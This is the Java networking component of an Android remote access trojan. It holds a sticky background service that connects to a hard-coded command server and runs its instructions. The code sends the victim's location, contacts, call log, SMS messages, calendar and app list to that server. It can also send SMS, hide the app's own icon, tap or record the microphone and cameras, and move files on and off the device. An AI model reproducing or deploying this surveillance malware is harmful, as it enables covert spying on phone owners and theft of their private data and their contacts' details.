package com.dev.ah10.androidratclient;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.Socket;
import java.text.DecimalFormatSymbols;
import java.util.ArrayList;
import java.util.Calendar;

@SuppressWarnings("SpellCheckingInspection")
public class NetworkHandler extends Service {
    public ClientSocket clientSocket; //Client Socket reference

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        MainActivity.nh = this; //Set the NetworkHandler instance
        ClientSocket cSocket = new ClientSocket(); //Create the ClientSocket async task
        clientSocket = cSocket; //Store it in a global variable
        cSocket.execute(); //Start the async task
        Log.e("NetworkHandler", "Client Socket async task started");
        return START_STICKY; //Start sticky -> system will restart it as soon as possible
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.e("NetworkHandler", "onDestroy");
        clientSocket.sendResponse("dclient"); //Send a disconnect request to the server (no more connections)
    }
}

class ClientSocket extends AsyncTask<Void, Void, Void> //Provides connection between device and server
{

    private int failedConnections = 0; //The count of failed connections
    private DataOutputStream dos; //The outputStream of the socket
    private Microphone _micService; //The microphone service
    private Cam _camService; //The camera service
    private Socket s = null; //Define the main Socket
    private FileSystem _fileService; //The file system service

    private String readFromStream(BufferedReader stream) //Read string line from the stream
    {
        try
        {
            return stream.readLine(); //Read the stream until the first \r\n
        }
        catch (Exception ex)
        {
            Log.e("readFromStream", "Error: " + ex.toString());
        }

        return null; //if reading failed, then return null
    }

    private byte[] readBytesFromStream(DataInputStream stream) //Read raw bytes from the stream
    {
        try
        {
            final int bufferSize = 4096; //Read buffer size
            byte[] buffer = new byte[bufferSize]; //Create read buffer
            int bytesRead = stream.read(buffer, 0, bufferSize); //read bytes from the stream
            byte[] result = new byte[bytesRead]; //Create a new buffer
            System.arraycopy(buffer, 0, result, 0, bytesRead); //Copy the readBytes from buffer1 to buffer2
            return result; //return buffer2
        }
        catch (Exception ex) //Failed to read bytes
        {
            Log.e("ClientSocket", "readBytesFromStream Error: " + ex.toString());
            return null;
        }
    }

    void sendResponse(String message) //Send a string message to server
    {
        if (dos == null) return; //If no outputStream, just return
        try
        {
            byte[] text = message.getBytes("UTF-8"); //Convert the UTF-8 message string to bytes
            String base64 = Base64.encodeToString(text, Base64.DEFAULT); //Convert the message bytes to Base64
            String dataLength = formatLength(base64.length()); //Get the formatted data length (for header)
            dos.writeBytes(dataLength + base64); //Write the message
        }
        catch (Exception ex) //Failed to send message
        {
            Log.e("sendResponse", "Error: " + ex.toString());
        }
    }

    void sendBytes(byte[] data, int dataLength, boolean ignoreProtocol) //Send raw bytes to server
    {
        try
        {
            BufferedOutputStream bos = new BufferedOutputStream(s.getOutputStream(), 250000); //Create a new output stream with a big buffer size
            if (!ignoreProtocol) //Use the length header protocol
            {
                String header = formatLength(dataLength); //Get the length header
                byte[] byteHeader = header.getBytes("UTF-8"); //Convert the length header to bytes
                byte[] fullBytes = new byte[byteHeader.length + dataLength]; //Create a buffer holding the full packet
                System.arraycopy(byteHeader, 0, fullBytes, 0, byteHeader.length); //Copy the header to the buffer
                System.arraycopy(data, 0, fullBytes, byteHeader.length, dataLength); //Copy the data to the buffer
                bos.write(fullBytes, 0, fullBytes.length); //Send the buffer to the server
                bos.flush(); //Flush the buffer to send
                Log.e("Send", "Bytes Sent: " + fullBytes.length);
            }
            else //Ignore the length header protocol
            {
                bos.write(data, 0, dataLength); //write the bytes to the stream
                bos.flush(); //Flush the buffer
                Log.e("Send", "bytes sent without protocol: " + dataLength);
            }
        }
        catch (Exception ex) //Failed to send bytes
        {
            Log.e("sendResponse", "Error: " + ex.toString());
        }
    }

    private String formatLength(int dataLength) //Get the formatted data length header
    {
        String strLength = String.valueOf(dataLength); //Convert dataLength to string
        StringBuilder sb = new StringBuilder();
        sb.append(strLength); //append the length

        //if length is not 9 chars long then append 0 at the start until it reaches 9 chars in length
        //so th header will always be 9 chars long for example the length: 12345 becomes
        //000012345
        for (int i = 0; i < 9 - strLength.length(); i++)
        {
            sb.insert(0, "0"); //Insert zero at the start of the result
        }

        return sb.toString(); //Return the result
    }

    @Override
    protected Void doInBackground(Void... params) { //Main connection, command handling
        Context applicationContext = MainActivity.context; //Get the application Context
        try
        {
            Log.e("ClientSocket", "Connecting to server, failed = " + failedConnections);
            String serverAddress = "192.168.10.56"; //Define the server address
            int serverPort = 101; //Define the server port
            s = new Socket(serverAddress, serverPort); //Connect to the server
            failedConnections = 0; //Reset the failed connections
            BufferedReader inputStream = new BufferedReader(new InputStreamReader(s.getInputStream())); //Create the inputStream (reading)
            DataOutputStream outputStream = new DataOutputStream(s.getOutputStream()); //Create the outputStream (writing)
            DataInputStream dataInputStream = new DataInputStream(s.getInputStream()); //Create a dataInputStream (reading raw bytes)
            dos = outputStream; //Set the global outputStream
            boolean appExit = false; //Can exit while loop
            if (_micService == null) _micService = new Microphone(this); //Setup the mic service
            if (_camService == null) _camService = new Cam(this); //Setup the cam service
            if (_fileService == null) _fileService = new FileSystem(this); //Setup the fs service
            boolean fileDownload = false; //Download file mode
            //noinspection ConstantConditions
            while (!appExit) //While appExit isn't true
            {
                if (fileDownload) //if downloading file
                {
                    byte[] recv = readBytesFromStream(dataInputStream); //Read bytes from the stream
                    boolean result = _fileService.downloadFile(recv); //Write it to the target file
                    if (result) //if full file received
                    {
                        fileDownload = false; //no longer downloading file
                        sendResponse("fupload|confirm"); //Send download confirm to the server
                    }
                    continue; //Continue, don't allow command interpretation
                }

                String command = readFromStream(inputStream); //Read the next line from the stream
                Log.e("Command", command);
                if (command == null) continue; //If failed to read, just loop again

                if (command.equals("test")) //Test Connection
                {
                    sendResponse("test");
                }

                if (command.equals("gps")) //Get Gps Location
                {
                    Location locationService = new Location(applicationContext); //Create a new locationService
                    android.location.Location location = locationService.GetLocationData(); //Get the location
                    if (location == null)
                    {
                        sendResponse("gps|failed");
                        continue;
                    }
                    String message = "gps|" + location.getLatitude() + "|" + location.getLongitude();
                    sendResponse(message);
                }

                if (command.equals("battery")) //Get battery Information
                {
                    Battery batteryInfo = new Battery(applicationContext);
                    String pct = batteryInfo.getBatteryLevel();
                    String charging = (batteryInfo.isBatteryCharging()) ? "Yes" : "No";
                    String chargeMethod = batteryInfo.getBatteryChargingMethod();
                    String temp = batteryInfo.getBatteryTemperature();
                    String message = "battery|" + pct + "|" + charging + "|" + chargeMethod + "|" + temp;
                    sendResponse(message);
                }

                if (command.equals("contacts")) //Get the contacts
                {
                    Contacts contactService = new Contacts(applicationContext); //Create new contact Service
                    Integer[] ids = contactService.getContactIds(); //Get the contact ids
                    String dataToSend = ""; //data string to send

                    for (Integer i : ids) //Get contact names for the ids
                    {
                        String contactName = contactService.getContactName(i);
                        dataToSend += String.valueOf(i) + ";" + contactName + "|";
                    }

                    dataToSend = dataToSend.substring(0, dataToSend.length() - 1); //Cut the last separator char
                    sendResponse("contactData" + dataToSend); //Send contacts to server
                }

                if (command.startsWith("contact|")) //Get the data of a selected contact
                {
                    String contactID = command.split("\\|")[1]; //Retrieve the contact id
                    Integer iContactID = Integer.parseInt(contactID); //Convert id to integer
                    Contacts contactService = new Contacts(applicationContext); //Create a new contact service
                    String[] email = contactService.getContactEmailAddresses(iContactID); //Get the email addresses of the contact
                    String[] phoneNumbers = contactService.getContactPhoneNumbers(iContactID); //Get the phone numbers of the contact
                    String address = contactService.getContactAddress(iContactID); //Get the physical address of the contact
                    String note = contactService.getContactNote(iContactID); //Get the note of the contact
                    String response = "|"; //data string

                    //Append phone numbers
                    for (String phoneNumber : phoneNumbers)
                    {
                        response += phoneNumber + ";";
                    }

                    response = response.substring(0, response.length() - 1); //Cut last sub-separator char
                    response += "|";

                    //Append email addresses
                    for (String emailAddress : email)
                    {
                        response += emailAddress + ";";
                    }

                    response = response.substring(0, response.length() - 1); //Cut last sub-separator char
                    response += "|" + address + "|" + note; //Append the address and the notes

                    sendResponse("contact" + response); //Send the contact details
                }

                if (command.startsWith("addcontact|")) //Add a contact
                {
                    String[] data = command.substring(11).split("\\|"); //Get the details of the contact
                    Contacts contactService = new Contacts(applicationContext); //Create a new Contact service
                    contactService.addContact(data[0], data[1], data[2], data[3], data[4]); //Add the contact
                }

                if (command.equals("calllog")) //Get the call log
                {
                    CallLog cLog = new CallLog(applicationContext); //Create a new callLog service
                    String callLog = cLog.getCallLog(); //Get the call log
                    sendResponse(callLog); //Send the call log
                }

                if (command.equals("sms")) //Get SMS Messages
                {
                    SMS smsService = new SMS(applicationContext); //Create new SMS service
                    String recv = smsService.getSmsReceived(); //Get the inbox
                    String sent = smsService.getSmsSent(); //Get the sent
                    String result = "sms-msg|" + recv + "|" + sent; //Combine the results
                    sendResponse(result); //Send the SMS messages to the server
                }

                if (command.startsWith("send-sms|")) //Send SMS message
                {
                    String data = command.substring(9); //Get the details
                    String[] parts = data.split("\\|"); //Format details
                    SMS smsService = new SMS(applicationContext); //Create new SMS service
                    smsService.sendSms(parts[0], parts[1]); //Send SMS
                }

                if (command.equals("apps")) //Get the list of apps
                {
                    Apps appService = new Apps(applicationContext); //Create new appService
                    String apps = appService.listInstalled(); //Get the installed apps
                    sendResponse(apps); //Respond to server
                }

                if (command.equals("self-hide")) //Hide the app icon
                {
                    Apps appService = new Apps(applicationContext); //Create new appService
                    appService.hideAppIcon(); //hide the icon
                }

                if (command.equals("self-show")) //Show the app icon
                {
                    Apps appService = new Apps(applicationContext); //Create new appService
                    appService.showAppIcon(); //show the icon
                }

                if (command.equals("get-calendar")) //Get calendar events
                {
                    CalendarManager calendarService = new CalendarManager(applicationContext); //Create new calendarService
                    String events = calendarService.getCalendarEvents(); //List events
                    sendResponse(events); //Respond to server
                }

                if (command.startsWith("add-calendar|")) //Add calendar event
                {
                    String data = command.substring(13); //Get the arguments
                    String[] parts = data.split("\\|"); //Separate the arguments
                    String startTime = parts[3]; //Starting time
                    String endTime = parts[4]; //Ending time
                    Long start = getCalendarTime(startTime); //Format start time
                    Long end = getCalendarTime(endTime); //Format end time

                    CalendarManager calendarService = new CalendarManager(applicationContext); //get calendarService
                    calendarService.addCalendarEvent(parts[0], parts[1], parts[2], start, end); //add event to calendar
                }

                if (command.startsWith("update-calendar|")) //Modify a calendar event
                {
                    String data = command.substring(16); //Get the arguments
                    String[] parts = data.split("\\|"); //Separate the arguments
                    String startTime = parts[4]; //Start time
                    String endTime = parts[5]; //End time
                    Long start = getCalendarTime(startTime); //Format start time
                    Long end = getCalendarTime(endTime); //Format end time

                    CalendarManager calendarService = new CalendarManager(applicationContext); //Create new calendarService
                    calendarService.updateCalendarEvent(parts[0], parts[1], parts[2], parts[3], start, end); //Modify event
                }

                if (command.startsWith("delete-calendar|")) //Delete a calendar event
                {
                    String data = command.substring(16); //Get the argument

                    CalendarManager calendarService = new CalendarManager(applicationContext); //Create new calendarService
                    calendarService.deleteCalendarEvent(data); //Delete the event
                }

                if (command.equals("mic-tap-start")) //Start streaming mic
                {
                    _micService.startTap();
                }

                if (command.equals("mic-tap-stop")) //Stop streaming mic
                {
                    _micService.stopTap();
                }

                if (command.equals("mic-record-start")) //Start recording mic
                {
                    _micService.startRecording();
                }

                if (command.equals("mic-record-stop")) //Stop recording mic
                {
                    _micService.stopRecording();
                }

                if (command.startsWith("cam-photo|")) //Take a photo
                {
                    String data = command.substring(10); //Get the argument
                    int facing = 0; //Cam facing
                    //Decide camera facing
                    if (data.equals("front")) facing = Cam.CAM_FACE;
                    if (data.equals("back")) facing = Cam.CAM_BACK;
                    _camService.takePicture(facing); //take the picture
                }

                if (command.startsWith("cam-record-start|")) //Start recording the camera
                {
                    String data = command.substring(17); //get the argument
                    int facing = 0; //Cam facing
                    //Decide the camera facing
                    if (data.equals("front")) facing = Cam.CAM_FACE;
                    if (data.equals("back")) facing = Cam.CAM_BACK;
                    _camService.startRecording(facing); //Start recording the video
                }

                if (command.startsWith("cam-tap-start|")) //Start streaming the camera
                {
                    String data = command.substring(14); //Get the arguments
                    String facingData = data.split("\\|")[0]; //facing arg
                    String quality = data.split("\\|")[1]; //Quality arg
                    String delay = data.split("\\|")[2]; //Delay arg
                    //Handle the decimal separator
                    DecimalFormatSymbols dfs = new DecimalFormatSymbols();
                    delay = delay.replace('.', dfs.getDecimalSeparator());
                    //Decide the camera facing
                    int facing = 0;
                    if (facingData.equals("front")) facing = Cam.CAM_FACE;
                    if (facingData.equals("back")) facing = Cam.CAM_BACK;
                    //Parse the image quality
                    Integer intQuality = Integer.parseInt(quality);
                    if (intQuality > 100) intQuality = 100;
                    if (intQuality < 0) intQuality = 0;
                    //Parse the delay
                    Float floatDelay = Float.parseFloat(delay);
                    floatDelay *= 1000;
                    Integer intDelay = Math.round(floatDelay);
                    _camService.startTap(facing, intQuality, intDelay); //Start streaming
                }

                if (command.equals("cam-record-stop")) //Stop recording
                {
                    _camService.stopRecording();
                }

                if (command.equals("cam-tap-stop")) //Stop streaming
                {
                    _camService.stopTap();
                }

                if (command.equals("flist")) //List files at /
                {
                    sendResponse(_fileService.listFiles());
                }

                if (command.startsWith("flist|")) //List files in directory
                {
                    String data = command.substring(6); //Get the argument
                    sendResponse(_fileService.listFiles(data)); //list files
                }

                if (command.startsWith("fcopy|")) //Copy a file
                {
                    String data = command.substring(6); //Get arguments
                    _fileService.copyFile(data); //Copy the file
                }

                if (command.startsWith("fmove|")) //Move a file
                {
                    String data = command.substring(6); //Get the argument
                    _fileService.moveFile(data); //Move the file
                }

                if (command.startsWith("fpaste|")) //Paste file
                {
                    String data = command.substring(7); //Get the argument
                    boolean result = _fileService.pasteFile(data); //Paste file
                    //Respond to server
                    if (result) sendResponse("fpaste|ok");
                    else sendResponse("fpaste|failed");
                }

                if (command.startsWith("frename|")) //Rename a file
                {
                    String data = command.substring(8); //Get the arguments
                    String[] args = data.split("\\|"); //Separate the arguments
                    boolean result = _fileService.renameFile(args[0], args[1]); //Rename the file
                    //Respond to server
                    if (result) sendResponse("frename|ok");
                    else sendResponse("frename|failed");
                }

                if (command.startsWith("fdownload|")) //Server download -> device is uploading
                {
                    String data = command.substring(10); //Get the argument
                    _fileService.uploadFile(data); //start uploading file
                }

                if (command.startsWith("fupload|")) //Server upload -> device is downloading
                {
                    String data = command.substring(8); //Geth the arguments
                    String[] args = data.split("\\|"); //Separate the arguments
                    boolean result = _fileService.initDownloadFile(args[0], Integer.parseInt(args[1])); //init file download
                    //Respond to server
                    if (result)
                    {
                        fileDownload = true;
                        sendResponse("fupload|ok");
                    }
                    else sendResponse("fupload|failed");
                }

                if (command.startsWith("fdel|")) //Delete file or directory
                {
                    String data = command.substring(5); //Get the argument
                    boolean result = _fileService.deleteFile(data); //Delete the file or directory
                    //Respond to server
                    if (result) sendResponse("fdel|ok");
                    else sendResponse("fdel|failed");
                }
            }
        }
        catch (Exception ex) //Connection failed
        {
            Log.e("ClientSocket", "Error: " + ex.toString());
            try
            {
                if (s != null && s.getSoTimeout() != 5000) s.setSoTimeout(5000); //Set the socket timeout
            }
            catch (Exception ex2)
            {
                Log.e("ClientSocket", "Reconnection error: " + ex2.toString());
            }
            failedConnections++; //the connection failed, so increment the counter
            doInBackground(); //Call doInBackground again
        }

        Log.e("NetworkHandler", "Quiting request loop");

        return null;
    }

    private Long getCalendarTime(String time) //Convert server response time format to epoch
    {
        if (time.equals("")) return (long)0; //if no time return 0
        String[] timePart = time.split(";"); //Split the time parts
        ArrayList<Integer> timeList = new ArrayList<>(); //Create a time part list
        Integer[] timeListArray = new Integer[timeList.size()]; //Create mirror integer array

        for (String part : timePart) //Loop through the time parts
        {
            Integer value = Integer.parseInt(part); //Convert part to integer
            timeList.add(value); //Add int part to list
        }

        timeList.toArray(timeListArray); //Convert the list to array

        Calendar calendar = Calendar.getInstance(); //Get a calendar :)
        calendar.set(timeListArray[0], timeListArray[1], timeListArray[2], timeListArray[3], timeListArray[4]); //Set calendar time

        return calendar.getTimeInMillis(); //Return the milliseconds (epoch time)
    }
}